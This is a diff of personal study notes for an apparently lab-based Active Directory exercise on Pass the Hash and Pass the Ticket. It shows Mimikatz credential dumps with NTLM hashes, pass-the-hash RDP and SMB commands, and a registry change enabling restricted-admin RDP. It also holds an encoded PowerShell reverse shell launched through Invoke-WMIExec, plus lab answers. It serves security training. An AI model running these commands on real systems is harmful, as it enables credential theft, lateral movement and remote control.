@@ -2313,7 +2313,7 @@ type pth.txt # flag
 ### Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.
 
 ```shell
-xfreerdp /v:10.129.239.28 /u:Administrator /dynamic-resolution /pth:30B3783CE2ABF1AF70F77D0660CF3453
+xfreerdp /v:10.129.204.23 /u:Administrator /dynamic-resolution /pth:30B3783CE2ABF1AF70F77D0660CF3453
 ```
 
 ![](./src/10_src/RDP_error.png)
@@ -2321,16 +2321,120 @@ xfreerdp /v:10.129.239.28 /u:Administrator /dynamic-resolution /pth:30B3783CE2AB
 So, we need to change the registry to permit the connection via RDP.
 
 ```shell
-netexec smb 10.129.239.28 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+netexec smb 10.129.204.23 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
 ```
 
 And then we can acces via RDP:
 
 ```shell
 # again
-xfreerdp /v:10.129.239.28 /u:Administrator /dynamic-resolution /pth:30B3783CE2ABF1AF70F77D0660CF3453
+xfreerdp /v:10.129.204.23 /u:Administrator /dynamic-resolution /pth:30B3783CE2ABF1AF70F77D0660CF3453
 ```
 
 ![](./src/10_src/RDP_success.png)
 
+
+DisableRestrictedAdmin
+### Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?
+
+```powershell
+./mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+```powershell
+Session           : Service from 0
+User Name         : david
+Domain            : INLANEFREIGHT
+Logon Server      : DC01
+Logon Time        : 10/6/2026 1:38:36 PM
+SID               : S-1-5-21-3325992272-2815718403-617452758-1107
+msv :
+ [00000003] Primary
+ * Username : david
+ * Domain   : INLANEFREIGHT
+ * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0
+ * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
+ * DPAPI    : eaa6db50c1544304014d858928d9694f
+   
+   
+---
+ msv :
+         [00000003] Primary
+         * Username : julio
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
+         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
+         * DPAPI    : 634db497baef212b777909a4ccaaf700
+        tspkg :
+        wdigest :
+         * Username : julio
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : julio
+         * Domain   : INLANEFREIGHT.HTB
+         * Password : (null)
+        ssp :
+        credman :
+```
+### Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.
+
+### Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.
+
+To solve both questions I used:
+
+```powershell
+# In mimikatz
+sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe
+sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe
+```
+### Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.
+
+```powershell
+# Import module before
+Invoke-WMIExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" -Verbose
+```
+
+>[!Important] VERY IMPORTANT
+>Import the module!! I spent lots of hours trying to get the reverse shell because of that.
+# Pass the Ticket (PtT) from Windows
+
+Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/). In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. We'll cover several ways to perform a PtT attack from Windows and Linux. In this section, we'll focus on Windows attacks, and in the following section, we'll cover attacks from Linux.
+## Kerberos protocol refresher
+
+The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.
+
+- The `Ticket Granting Ticket` (`TGT`) is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
+- The `Ticket Granting Service` (`TGS`) is requested by users who want to use a service. These tickets allow services to verify the user's identity.
+
+When a user requests a `TGT`, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user's identity (because the domain knows the user's password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.
+
+If the user wants to connect to an MSSQL database, it will request a `Ticket Granting Service` (`TGS`) to the `Key Distribution Center` (`KDC`), presenting its `Ticket Granting Ticket` (`TGT`). Then it will give the TGS to the MSSQL database server for authentication.
+## Pass the Ticket (PtT) attack
+
+We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It can be:
+
+- Service Ticket (TGS) to allow access to a particular resource.
+- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
+## Scenario
+
+Let's imagine we are on a pentest, and we manage to phish a user and gain access to the user's computer. We found a way to obtain administrative privileges on this computer and are working with local administrator rights. Let's explore several ways we can manage to get access tickets on this computer and how we can create new tickets.
+## Harvesting Kerberos tickets from Windows
+
+On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.
+
+We can harvest all tickets from a system using the `Mimikatz` module `sekurlsa::tickets /export`. The result is a list of files with the extension `.kirbi`, which contain the tickets.
+#### Mimikatz - Export tickets
+
+```powershell
+privilege::debug
+sekurlsa::tickets /export
+exit
+
+dir *.kirbi
+```
+
+The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.
 
